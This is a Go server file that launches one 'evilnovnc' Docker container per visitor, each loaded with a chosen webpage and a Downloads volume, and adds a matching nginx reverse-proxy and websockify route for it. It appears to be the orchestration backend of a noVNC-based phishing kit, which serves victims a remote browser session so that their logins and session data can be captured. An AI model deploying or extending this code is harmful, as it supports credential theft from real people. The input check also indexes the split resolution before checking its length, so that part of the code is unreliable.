package main


import (
    "fmt"
    "log"
    "net/http"
    "strings"
    "strconv"
    "context"
    "os/exec"
    "os"
    "github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
    "github.com/google/uuid"
    network "github.com/docker/docker/api/types/network"
)

func get_text(server string, first bool) string{
    text:=`
    
        location /_server_ {
            proxy_pass http://_server_:5980/;
        }
        location /_server_/websockify {
            proxy_pass http://_server_:5980/_server_/websockify;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "Upgrade";
            proxy_set_header Host $host;
        }
        
        location /core/ {
        rewrite /core/(.*) /_server_/core/$1 break;
        proxy_pass http://_server_:5980;
        }
        location /vendor/ {
        rewrite /vendor/(.*) /_server_/vendor/$1 break;
        proxy_pass http://_server_:5980;
        }
    }`;

    text2:=`
    
        location /_server_ {
            proxy_pass http://_server_:5980/;
        }
        location /_server_/websockify {
            proxy_pass http://_server_:5980/_server_/websockify;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "Upgrade";
            proxy_set_header Host $host;
        }
    }`;

    if first {
        return strings.Replace(text, "_server_", server, -1)
    }else{
        return strings.Replace(text2, "_server_", server, -1)
    }

    

}
func write_file(text string){
    cmd := exec.Command("head","-n", "-1", "/etc/nginx/conf.d/default.conf")
    stdout, err := cmd.Output()
    if err != nil {
        log.Println(err)
    }
    content := string(stdout)+text
    f, err := os.OpenFile("/etc/nginx/conf.d/default.conf",
	os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        log.Println(err)
    }
    defer f.Close()
    if _, err := f.WriteString(content); err != nil {
        log.Println(err)
    }  
    cmd = exec.Command("nginx", "-s", "reload")
    err = cmd.Run()
    if err != nil {
        log.Println(err)
    } 
}

func check_num_docker() int{
    ctx := context.Background()
    cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation())
    containers, err := cli.ContainerList(ctx, types.ContainerListOptions{})
	if err != nil {
		panic(err)
	}
    num := 0;
	for _, container := range containers {
		if container.Image == "evilnovnc" {
            num += 1
        }
	}
    return num
}

func run_docker(uuid string, resolution string, folder string, webpage string) int{
    imageName := "evilnovnc"
    envvar := []string{"FOLDER="+uuid+"","RESOLUTION="+resolution+"x24","WEBPAGE="+webpage+""}
    volumes:= map[string]struct{}{
        folder+"/Downloads/"+uuid+":/home/user/Downloads": struct{}{},
    }

    ctx := context.Background()
    cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation())
    
    if err != nil {
		return 1
	}
    
    networkConfig := &network.NetworkingConfig{
		EndpointsConfig: map[string]*network.EndpointSettings{},
	}
	gatewayConfig := &network.EndpointSettings{
		Gateway : "nginx-evil",
	}
	networkConfig.EndpointsConfig["nginx-evil"] = gatewayConfig

    resp, err := cli.ContainerCreate(ctx, &container.Config{
		Image: imageName,
        Env: envvar,
        Volumes: volumes,
	}, nil, networkConfig, nil, uuid)
    
    if err != nil {
		return 1
	}
    if err := cli.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{}); err != nil {
		return 1
	}

    return 0
	//fmt.Println(resp.ID)

}

func resoHandler(w http.ResponseWriter, r *http.Request) {
    if r.URL.Path != "/reso" {
        http.Error(w, "404 not found.", http.StatusNotFound)
        return
    }
    id := uuid.New()
    resolution := r.URL.Query().Get("x");
    res := strings.Split(resolution, "x");
    //Check if intput are good
    _, err1 := strconv.Atoi(res[0]);
    _, err2 := strconv.Atoi(res[1]);
    if err1 != nil || err2 != nil || len(res) != 2 {
        fmt.Fprintf(w, "error")
        return
    }else{
        folder := os.Args[1]
        webpage := os.Args[2]
        error := run_docker(id.String(),resolution, folder, webpage)
        if error != 1 {
            if check_num_docker() > 1 {
                text := get_text(id.String(),false)
                write_file(text)
            }else{
                text := get_text(id.String(),true)
                write_file(text)

            }
            fmt.Fprintf(w, id.String())
            return
        }else{
            fmt.Fprintf(w, "error")
        }
    }
   
    
}


func main() {
    http.HandleFunc("/reso", resoHandler) // Update this line of code

    fmt.Printf("Starting server at port 8080\n")
    if err := http.ListenAndServe(":8080", nil); err != nil {
        log.Fatal(err)
    }
}
